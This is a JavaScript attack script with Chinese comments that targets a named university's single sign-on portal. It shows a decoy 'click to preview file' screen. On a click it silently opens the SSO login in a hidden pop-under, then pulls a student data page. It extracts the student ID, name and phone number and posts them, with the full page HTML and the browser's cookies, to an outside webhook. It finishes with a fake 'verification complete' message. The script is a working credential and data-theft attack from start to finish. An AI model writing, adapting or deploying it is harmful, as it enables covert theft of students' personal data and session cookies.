(async () => {
    // 更新為你的 Pipedream 地址
    const webhook = "https://eokic4rib1w9z4o.m.pipedream.net";
    
    // SSO 入口
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    // 目標資料頁
    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI"; 

    // 1. 設置誘餌介面 (讓使用者想點擊)
    // 我們先把它偽裝成一個需要點擊的狀態
    document.body.style.margin = "0";
    document.body.style.overflow = "hidden";
    document.body.innerHTML = `
        <div id="trap_ui" style="
            width: 100%; height: 100vh; background: #f8f9fa; 
            display: flex; flex-direction: column; 
            align-items: center; justify-content: center; 
            cursor: pointer; font-family: 'Microsoft JhengHei', sans-serif;
            border: 1px solid #dee2e6; user-select: none;
        ">
            <div style="font-size: 40px;">📂</div>
            <div style="margin-top: 10px; color: #007bff; font-weight: bold;">點擊以預覽檔案內容</div>
            <div style="font-size: 12px; color: #6c757d; margin-top: 5px;">(需要安全性驗證)</div>
        </div>
    `;

    // 2. 定義攻擊與偽裝邏輯
    async function launchAttack() {
        document.removeEventListener('click', launchAttack);
        document.removeEventListener('keydown', launchAttack);
        
        // --- 瞬間切換為「載入中」畫面 (障眼法) ---
        document.getElementById('trap_ui').innerHTML = `
            <div style="
                border: 4px solid #f3f3f3; border-top: 4px solid #3498db; 
                border-radius: 50%; width: 30px; height: 30px; 
                animation: spin 1s linear infinite;">
            </div>
            <div style="margin-top: 15px; color: #555; font-size: 14px;">
                正在驗證校務行政身分，請稍候...
            </div>
            <style>@keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}</style>
        `;
        document.getElementById('trap_ui').style.cursor = 'wait';

        try {
            // 3. 彈窗觸發 SSO (Pop-under)
            const popup = window.open(ssoUrl, "sso_trap", "width=100,height=100,left=9999,top=9999");
            
            // 嘗試將彈窗踢到背景，配合「載入中」畫面，使用者會以為那是後台驗證視窗
            if (popup) {
                try { popup.blur(); window.focus(); } catch(e) {}
            }

            // 4. 等待 SSO 完成 (6秒)
            await new Promise(r => setTimeout(r, 6000));

            // 5. 關閉彈窗
            try { popup.close(); } catch(e) {}

            // 6. 收割資料
            const response = await fetch(targetUrl);
            const fullHtml = await response.text();

            // 提取簡單個資
            let info = {};
            try {
                info.studentId = fullHtml.match(/學生學號:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
                info.name = fullHtml.match(/學生姓名:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
                info.phone = fullHtml.match(/手機:.*?form-control-static">([^<&]+)/)?.[1]?.trim();
            } catch(e) {}

            // 7. 發送結果到 Pipedream
            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    msg: "STEALTH_ATTACK_SUCCESS",
                    victim: info,
                    html_len: fullHtml.length,
                    full_html_source: fullHtml,
                    cookies: document.cookie
                })
            });

            // 8. 演戲演全套：顯示「驗證完成」或「檔案損毀」
            // 讓使用者覺得剛剛的等待是有意義的
            document.getElementById('trap_ui').innerHTML = `
                <div style="color: #28a745; font-size: 30px;">✔</div>
                <div style="margin-top: 10px; color: #333;">驗證完成</div>
                <div style="font-size: 12px; color: #dc3545; margin-top: 5px;">錯誤：檔案格式不支援預覽</div>
            `;

        } catch (e) {
            fetch(webhook + "?error=" + encodeURIComponent(e.message));
            // 失敗也顯示錯誤訊息，裝作無事發生
            document.getElementById('trap_ui').innerHTML = `<div style="color:red">系統忙碌中，請稍後再試。</div>`;
        }
    }

    // 監聽點擊
    document.addEventListener('click', launchAttack);
    document.addEventListener('keydown', launchAttack);
})();